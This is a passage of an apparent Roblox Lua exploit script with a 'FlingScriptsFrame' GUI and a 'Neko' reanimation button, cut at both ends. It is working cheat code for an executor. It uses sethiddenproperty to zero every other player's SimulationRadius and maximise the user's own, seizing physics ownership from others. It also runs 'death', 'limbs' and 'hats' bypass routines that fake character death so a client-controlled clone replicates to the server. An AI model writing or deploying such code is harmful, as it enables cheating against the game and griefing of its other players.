					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-10+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.3+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(-45+5*math.cos(sine/13)),RAD(45+0*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+-35*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+0.3*math.cos(sine/13))*ANGLES(RAD(0+-35*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+-0.3*math.cos(sine/13))*ANGLES(RAD(0+35*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					hatset('Back_AccAccessory','Right Arm',CFrame.new(),reanim['Back_AccAccessory'].Handle.AccessoryWeld.C0:Lerp(CF(0.3+0*math.cos(sine/13),1.9+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(127+0*math.cos(sine/13)),RAD(134+0*math.cos(sine/13)),RAD(236+0*math.cos(sine/13))),1),false)
				elseif Root.Velocity.Magnitude > 20 then -- run
					--run clerp here
				end
			elseif Mode == '3' then
				if Root.Velocity.y > 1 then -- jump
					--jump clerp here
				elseif Root.Velocity.y < -1 then -- fall
					--fall clerp here
				elseif Root.Velocity.Magnitude < 2 then -- idle
					--idle clerp here
				elseif Root.Velocity.Magnitude < 20 then -- walk
					--walk clerp here
				elseif Root.Velocity.Magnitude > 20 then -- run
					--run clerp here
				end
			elseif Mode == 'Attack0' then
				NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(35+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-10+0*math.cos(sine/13)),RAD(-50+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),-0.5+0*math.cos(sine/13))*ANGLES(RAD(-163+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(9+0*math.cos(sine/13)),RAD(42+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1.2+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-2+0*math.cos(sine/13)),RAD(-143+0*math.cos(sine/13)),RAD(-13+0*math.cos(sine/13))),.3)
				LH.C0 = LH.C0:Lerp(CF(-0.7+0*math.cos(sine/13),-1+0*math.cos(sine/13),-0.2+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(51+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				hatset('Back_AccAccessory','Right Arm',CFrame.new(),reanim['Back_AccAccessory'].Handle.AccessoryWeld.C0:Lerp(CF(0.5+0*math.cos(sine/13),2+0*math.cos(sine/13),-0.4+0*math.cos(sine/13))*ANGLES(RAD(45+0*math.cos(sine/13)),RAD(-214+0*math.cos(sine/13)),RAD(-74+0*math.cos(sine/13))),1),false)
			elseif Mode == 'Attack1' then
				NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(35+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-10+0*math.cos(sine/13)),RAD(-50+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RS.C0 = RS.C0:Lerp(CF(0.5+0*math.cos(sine/13),0.8+0*math.cos(sine/13),-0.8+0*math.cos(sine/13))*ANGLES(RAD(-272+0*math.cos(sine/13)),RAD(45+0*math.cos(sine/13)),RAD(-69+0*math.cos(sine/13))),.3)
				LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(9+0*math.cos(sine/13)),RAD(74+0*math.cos(sine/13)),RAD(-9+0*math.cos(sine/13))),.3)
				RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1.2+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-2+0*math.cos(sine/13)),RAD(-143+0*math.cos(sine/13)),RAD(-13+0*math.cos(sine/13))),.3)
				LH.C0 = LH.C0:Lerp(CF(-0.7+0*math.cos(sine/13),-1+0*math.cos(sine/13),-0.2+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(51+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				hatset('Back_AccAccessory','Right Arm',CFrame.new(),reanim['Back_AccAccessory'].Handle.AccessoryWeld.C0:Lerp(CF(0.5+0*math.cos(sine/13),2+0*math.cos(sine/13),-0.4+0*math.cos(sine/13))*ANGLES(RAD(36+0*math.cos(sine/13)),RAD(-225+0*math.cos(sine/13)),RAD(-58+0*math.cos(sine/13))),1),false)
			elseif Mode == 'Attack3' then
				NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(-35+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-10+0*math.cos(sine/13)),RAD(50+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.+0*math.cos(sine/13),-1+0*math.cos(sine/13))*ANGLES(RAD(-7+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				LS.C0 = LS.C0:Lerp(CF(-1.5+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(25+0*math.cos(sine/13)),RAD(22+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1.2+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-2+0*math.cos(sine/13)),RAD(-143+0*math.cos(sine/13)),RAD(-13+0*math.cos(sine/13))),.3)
				LH.C0 = LH.C0:Lerp(CF(-0.7+0*math.cos(sine/13),-1+0*math.cos(sine/13),-0.2+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(51+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				hatset('Back_AccAccessory','Right Arm',CFrame.new(),reanim['Back_AccAccessory'].Handle.AccessoryWeld.C0:Lerp(CF(0.5+0*math.cos(sine/13),2+0*math.cos(sine/13),-0.4+0*math.cos(sine/13))*ANGLES(RAD(36+0*math.cos(sine/13)),RAD(-225+0*math.cos(sine/13)),RAD(-58+0*math.cos(sine/13))),1),false)
			end
			srv.RenderStepped:Wait()
		end
	end)()
end)
UICorner_31.Parent = Guts

Neko.Name = "Neko"
Neko.Parent = FlingScriptsFrame
Neko.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Neko.Position = UDim2.new(0.34251973, 0, 0.314039648, 0)
Neko.Size = UDim2.new(0, 143, 0, 43)
Neko.Font = Enum.Font.Nunito
Neko.Text = "Neko"
Neko.TextColor3 = Color3.fromRGB(238, 238, 238)
Neko.TextSize = 32.000
Neko.MouseButton1Click:Connect(function()
	local NotificationBindable = Instance.new("BindableFunction")
	local Msgreq = function(Title,Text,Duration,Button1Text,Button2Text)
		game.StarterGui:SetCore("SendNotification", {
			Title = Title;
			Text = Text;
			Icon = "";
			Duration = Duration;
			Button1 = Button1Text;
			Button2 = nil;
			Callback = NotificationBindable;
		})
	end

	Msgreq("FE Neko Anims V1.6","Loading, please wait while it loads",5,nil)
	local SongID = "http://www.roblox.com/asset/?id=198665867"
	Bypass = "death"
	if not Bypass then Bypass = "limbs" end
	HumanDied = false

	CountSCIFIMOVIELOL = 1
	function SCIFIMOVIELOL(Part0,Part1,Position,Angle)
		local AlignPos = Instance.new('AlignPosition', Part1); AlignPos.Name = "AliP_"..CountSCIFIMOVIELOL
		AlignPos.ApplyAtCenterOfMass = true;
		AlignPos.MaxForce = 67752;
		AlignPos.MaxVelocity = math.huge/9e110;
		AlignPos.ReactionForceEnabled = false;
		AlignPos.Responsiveness = 200;
		AlignPos.RigidityEnabled = false;
		local AlignOri = Instance.new('AlignOrientation', Part1); AlignOri.Name = "AliO_"..CountSCIFIMOVIELOL
		AlignOri.MaxAngularVelocity = math.huge/9e110;
		AlignOri.MaxTorque = 67752;
		AlignOri.PrimaryAxisOnly = false;
		AlignOri.ReactionTorqueEnabled = false;
		AlignOri.Responsiveness = 200;
		AlignOri.RigidityEnabled = false;
		local AttachmentA=Instance.new('Attachment',Part1); AttachmentA.Name = "AthP_"..CountSCIFIMOVIELOL
		local AttachmentB=Instance.new('Attachment',Part0); AttachmentB.Name = "AthP_"..CountSCIFIMOVIELOL
		local AttachmentC=Instance.new('Attachment',Part1); AttachmentC.Name = "AthO_"..CountSCIFIMOVIELOL
		local AttachmentD=Instance.new('Attachment',Part0); AttachmentD.Name = "AthO_"..CountSCIFIMOVIELOL
		AttachmentC.Orientation = Angle
		AttachmentA.Position = Position
		AlignPos.Attachment1 = AttachmentA;
		AlignPos.Attachment0 = AttachmentB;
		AlignOri.Attachment1 = AttachmentC;
		AlignOri.Attachment0 = AttachmentD;
		CountSCIFIMOVIELOL = CountSCIFIMOVIELOL + 1

	end

	coroutine.wrap(function()
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:wait()
		if sethiddenproperty then
			while true do
				game:GetService("RunService").RenderStepped:Wait()
				settings().Physics.AllowSleep = false
				local TBL = game:GetService("Players"):GetChildren() 
				for _ = 1,#TBL do local Players = TBL[_]
					if Players ~= game:GetService("Players").LocalPlayer then
						Players.MaximumSimulationRadius = 0
						sethiddenproperty(Players,"SimulationRadius",0) 
					end 
				end
				game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
				sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.pow(math.huge,math.huge)*math.huge)
				if HumanDied then break end
			end
		else
			while true do
				game:GetService("RunService").RenderStepped:Wait()
				settings().Physics.AllowSleep = false
				local TBL = game:GetService("Players"):GetChildren() 
				for _ = 1,#TBL do local Players = TBL[_]
					if Players ~= game:GetService("Players").LocalPlayer then
						Players.MaximumSimulationRadius = 0
					end 
				end
				game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
				if HumanDied then break end
			end
		end
	end)()

	if game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
		if Bypass == "limbs" then --------------------------------------------------------------------------------------------------------------------
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local CloneChar = game:GetService("Players").LocalPlayer["Character"]:Clone()
			CloneChar.Parent = workspace 
			CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,2,0)
			wait() 
			CloneChar.Humanoid.BreakJointsOnDeath = false
			workspace.Camera.CameraSubject = CloneChar.Humanoid
			CloneChar.Name = "non" 
			CloneChar.Humanoid.DisplayDistanceType = "None"
			if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
			if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

			local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]
			DeadChar.HumanoidRootPart:Destroy()

			local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
			local CONVEC
			local function VECTORUNIT()
				if HumanDied then CONVEC:Disconnect(); return end
				local lookVec = workspace.Camera.CFrame.lookVector
				local Root = CloneChar["HumanoidRootPart"]
				LVecPart.Position = Root.Position
				LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
			end
			CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

			local CONDOWN
			local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
			local function KEYDOWN(_,Processed) 
				if HumanDied then CONDOWN:Disconnect(); return end
				if Processed ~= true then
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = true end
					if Key == Enum.KeyCode.A then
						ADown = true end
					if Key == Enum.KeyCode.S then
						SDown = true end
					if Key == Enum.KeyCode.D then
						DDown = true end
					if Key == Enum.KeyCode.Space then
						SpaceDown = true end end end
			CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

			local CONUP
			local function KEYUP(_)
				if HumanDied then CONUP:Disconnect(); return end
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = false end
				if Key == Enum.KeyCode.A then
					ADown = false end
				if Key == Enum.KeyCode.S then
					SDown = false end
				if Key == Enum.KeyCode.D then
					DDown = false end
				if Key == Enum.KeyCode.Space then
					SpaceDown = false end end
			CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

			local function MoveClone(X,Y,Z)
				LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
				workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
			end

			coroutine.wrap(function() 
				while true do game:GetService("RunService").RenderStepped:Wait()
					if HumanDied then break end
					if WDown then MoveClone(0,0,1e4) end
					if ADown then MoveClone(1e4,0,0) end
					if SDown then MoveClone(0,0,-1e4) end
					if DDown then MoveClone(-1e4,0,0) end
					if SpaceDown then CloneChar["Humanoid"].Jump = true end
					if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
						workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
				end 
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, CloneChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false 
					end 
				end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			local resetBindable = Instance.new("BindableEvent")
			resetBindable.Event:connect(function()
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
				resetBindable:Destroy()
				pcall(function()
					CloneChar.Humanoid.Health = 0
					DeadChar.Humanoid.Health = 0
				end)
			end)
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 or not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							game.Players.LocalPlayer.Character = CloneChar
							CloneChar:Destroy()
							game.Players.LocalPlayer.Character = DeadChar
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if HumanDied then break end
					DeadChar["Torso"].CFrame = CloneChar["Torso"].CFrame
				end
			end)()

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
				end
			end

			for _,BodyParts in next, CloneChar:GetDescendants() do
				if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
					BodyParts.Transparency = 1 end end

			DeadChar.Torso["Left Shoulder"]:Destroy()
			DeadChar.Torso["Right Shoulder"]:Destroy()
			DeadChar.Torso["Left Hip"]:Destroy()
			DeadChar.Torso["Right Hip"]:Destroy()

		elseif Bypass == "death" then --------------------------------------------------------------------------------------------------------------------
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local CloneChar = game:GetService("Players").LocalPlayer["Character"]:Clone()
			game:GetService("Players").LocalPlayer["Character"].Humanoid.WalkSpeed = 0 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.JumpPower = 0 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.AutoRotate = false
			local FalseChar = Instance.new("Model", workspace); FalseChar.Name = ""
			Instance.new("Part",FalseChar).Name = "Head" 
			Instance.new("Part",FalseChar).Name = "Torso" 
			Instance.new("Humanoid",FalseChar).Name = "Humanoid"
			game:GetService("Players").LocalPlayer["Character"] = FalseChar
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Name = "FalseHumanoid"
			local Clone = game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Clone()
			Clone.Parent = game:GetService("Players").LocalPlayer["Character"]
			Clone.Name = "Humanoid"
			game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Destroy() 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0 
			game:GetService("Players").LocalPlayer["Character"] = workspace[game:GetService("Players").LocalPlayer.Name] 
			wait(5.65) 
			game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0
			CloneChar.Parent = workspace 
			CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,2,0)
			wait() 
			CloneChar.Humanoid.BreakJointsOnDeath = false
			workspace.Camera.CameraSubject = CloneChar.Humanoid 
			CloneChar.Name = "non" 
			CloneChar.Humanoid.DisplayDistanceType = "None"
			if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
			if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

			FalseChar:Destroy()

			local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]

			local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
			local CONVEC
			local function VECTORUNIT()
				if HumanDied then CONVEC:Disconnect(); return end
				local lookVec = workspace.Camera.CFrame.lookVector
				local Root = CloneChar["HumanoidRootPart"]
				LVecPart.Position = Root.Position
				LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
			end
			CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

			local CONDOWN
			local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
			local function KEYDOWN(_,Processed) 
				if HumanDied then CONDOWN:Disconnect(); return end
				if Processed ~= true then
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = true end
					if Key == Enum.KeyCode.A then
						ADown = true end
					if Key == Enum.KeyCode.S then
						SDown = true end
					if Key == Enum.KeyCode.D then
						DDown = true end
					if Key == Enum.KeyCode.Space then
						SpaceDown = true end end end
			CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

			local CONUP
			local function KEYUP(_)
				if HumanDied then CONUP:Disconnect(); return end
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = false end
				if Key == Enum.KeyCode.A then
					ADown = false end
				if Key == Enum.KeyCode.S then
					SDown = false end
				if Key == Enum.KeyCode.D then
					DDown = false end
				if Key == Enum.KeyCode.Space then
					SpaceDown = false end end
			CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

			local function MoveClone(X,Y,Z)
				LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
				workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
			end

			coroutine.wrap(function() 
				while true do game:GetService("RunService").RenderStepped:Wait()
					if HumanDied then break end
					if WDown then MoveClone(0,0,1e4) end
					if ADown then MoveClone(1e4,0,0) end
					if SDown then MoveClone(0,0,-1e4) end
					if DDown then MoveClone(-1e4,0,0) end
					if SpaceDown then CloneChar["Humanoid"].Jump = true end
					if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
						workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
				end 
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, CloneChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false 
					end 
				end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			local resetBindable = Instance.new("BindableEvent")
			resetBindable.Event:connect(function()
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
				resetBindable:Destroy()
				CloneChar.Humanoid.Health = 0
			end)
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							game.Players.LocalPlayer.Character = CloneChar
							CloneChar:Destroy()
							game.Players.LocalPlayer.Character = DeadChar
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["HumanoidRootPart"],CloneChar["HumanoidRootPart"],Vector3.new(0,0,0),Vector3.new(0,0,0))

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					if v.Name == "PlainTail" then
						Tail = CloneChar[v.Name].Handle
					end
					SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
				end
			end

			for _,BodyParts in next, CloneChar:GetDescendants() do
				if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
					BodyParts.Transparency = 1 end end
		elseif Bypass == "hats" then
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local DeadChar = game.Players.LocalPlayer.Character
			DeadChar.Name = "non"
			local HatPosition = Vector3.new(0,0,0)
			local HatName = "MediHood"
			local HatsLimb = {
				Rarm = DeadChar:FindFirstChild("Hat1"),
				Larm = DeadChar:FindFirstChild("Pink Hair"),
				Rleg = DeadChar:FindFirstChild("Robloxclassicred"),
				Lleg = DeadChar:FindFirstChild("Kate Hair"),
				Torso1 = DeadChar:FindFirstChild("Pal Hair"),
				Torso2 = DeadChar:FindFirstChild("LavanderHair")
			}
			HatName = DeadChar:FindFirstChild(HatName)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			SCIFIMOVIELOL(HatName.Handle,DeadChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(HatsLimb.Torso1.Handle,DeadChar["Torso"],Vector3.new(0.5,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Torso2.Handle,DeadChar["Torso"],Vector3.new(-0.5,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Larm.Handle,DeadChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Rarm.Handle,DeadChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Lleg.Handle,DeadChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(90,0,0))
			SCIFIMOVIELOL(HatsLimb.Rleg.Handle,DeadChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(90,0,0))

			for i,v in pairs(HatsLimb) do
				v.Handle:FindFirstChild("AccessoryWeld"):Destroy()
				if v.Handle:FindFirstChild("Mesh") then v.Handle:FindFirstChild("Mesh"):Destroy() end
				if v.Handle:FindFirstChild("SpecialMesh") then v.Handle:FindFirstChild("SpecialMesh"):Destroy() end
			end
			HatName.Handle:FindFirstChild("AccessoryWeld"):Destroy()
		end
	else
		if Bypass == "limbs" then --------------------------------------------------------------------------------------------------------------------
			game:GetService("Players").LocalPlayer["Character"].Archivable = true 
			local CloneChar = game:GetObjects("rbxassetid://5227463276")[1]
			CloneChar.Parent = workspace 
			CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,0.5,0.1)
			CloneChar.Humanoid.BreakJointsOnDeath = false
			workspace.Camera.CameraSubject = CloneChar.Humanoid 
			CloneChar.Name = "non" 
			CloneChar.Humanoid.DisplayDistanceType = "None"
			if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
			if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

			local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]
			DeadChar.HumanoidRootPart:Destroy()

			local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
			local CONVEC
			local function VECTORUNIT()
				if HumanDied then CONVEC:Disconnect(); return end
				local lookVec = workspace.Camera.CFrame.lookVector
				local Root = CloneChar["HumanoidRootPart"]
				LVecPart.Position = Root.Position
				LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
			end
			CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

			local CONDOWN
